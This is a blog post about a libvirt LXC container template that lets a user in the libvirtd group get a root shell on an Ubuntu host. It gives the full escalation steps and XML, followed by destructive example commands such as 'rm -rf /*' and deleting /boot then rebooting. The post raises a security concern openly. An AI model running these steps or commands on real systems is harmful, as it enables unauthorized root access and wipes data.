---
layout: post
title: Docker Container Madness
---

(...or How I Got Root in Less than 5 Minutes)

I'm unsure if this is actually a vulnerability or just a usability problem with the normal behaviour of [LXC](https://linuxcontainers.org/)/[Docker](https://www.docker.com/)/[Libvirt](https://libvirt.org/). Nevertheless, this seemingly harmless template file seems to cause **A LOT** of worry, as it allowed me to elevate privileges on the host system from an ordainary user account. I imagine new users of Docker, like myself, should be more concerned about how safe these defaults really are.

<p align="center">
<img src="https://raw.githubusercontent.com/adrianlshaw/adrianlshaw.github.com/master/images/docker.png" alt="Docker logo" title="Docker" style="width: 50%; height: 50%"/>
</p>

If you want to try this out, then here is the preamble if you are running a Debian-based Linux. In this case I am running Ubuntu 14.04.1. 
{% highlight bash %}
admin@host:~$ sudo apt-get install docker virt-manager
{% endhighlight %}

Create an unprivileged user, but with access to the `libvirtd` group:
{% highlight bash %}
admin@host:~$ sudo useradd -G libvirtd user 
admin@host:~$ sudo passwd user 
{% endhighlight %}
Now you should login as the ordinary user. Save the following XML template, which contains a name, a memory limit, console access and a shell. E.g. at /tmp/container.xml

{% highlight xml %}
<domain type='lxc'>
	<name>test</name>
	<memory>102400</memory>
	<os>
		<type>exe</type>
		<init>/bin/sh</init>
	</os>
	<devices>
		<console type='pty'/>
	</devices>
</domain>
{% endhighlight %}

Import the template into Libvirt:
{% highlight bash %}
user@host:~$ virsh define container.xml
{% endhighlight %}

Start the container. Make sure you have the Libvirt environment variable exported to work with LXC (e.g. `LIBVIRT_DEFAULT_URI=lxc:///`), such that Libvirt doesn't go looking for Xen or KVM.

{% highlight bash %}
user@host:~$ export LIBVIRT_DEFAULT_URI=lxc:///
user@host:~$ virsh start test
user@host:~$ virsh console test
{% endhighlight %}

And now try to run the **bash** shell:

{% highlight bash %}
  Connected to domain test
  Escape character is ^]
  
# bash
  bash: groups: command not found
  /bin/lesspipe: 1: /bin/lesspipe: basename: not found
  /bin/lesspipe: 1: /bin/lesspipe: dirname: not found
  /bin/lesspipe: 295: [: =: unexpected operator
  Command 'dircolors' is available in '/usr/bin/dircolors'
  The command could not be located because '/usr/bin' is not included in the PATH environment variable.
  dircolors: command not found
root@host:/# 
{% endhighlight %}

Huh? You now have root on the host. Without any prompt for a superuser password. 
What kind of messed up world is this? I can read/write to any file on the host:

Provide devastation:
{% highlight bash %}
root@host:/# rm -rf /*
{% endhighlight %}

Or alternatively just cause a bit of downtime:

{% highlight bash %}
root@host:/# rm /boot/*; reboot;
{% endhighlight %}

You can access a lot of the system programs in /bin, but it's trivial to add yourself to the `sudoers` group instead. 
Is it possible to be careful with Docker? It doesn't seem safe for mortals and is hardly encouraging. Like what Dan Walsh said in a recent article, it seems that "containers do not contain". At least not without a lot of experience and carefully crafted configs. It would be a shame if such obscure semantics will let down the overall usability of the platform.

Thoughts are welcomed. Especially from Docker magicians - what are the semantics behind this configuration file? Privileges by default? My user had no superuser access...I expect them to remain that way. 

{% highlight bash %}
$ docker version

Client version: 1.0.1
Client API version: 1.12
Go version (client): go1.2.1
Git commit (client): 990021a
Server version: 1.0.1
Server API version: 1.12
Go version (server): go1.2.1
Git commit (server): 990021a
{% endhighlight %}
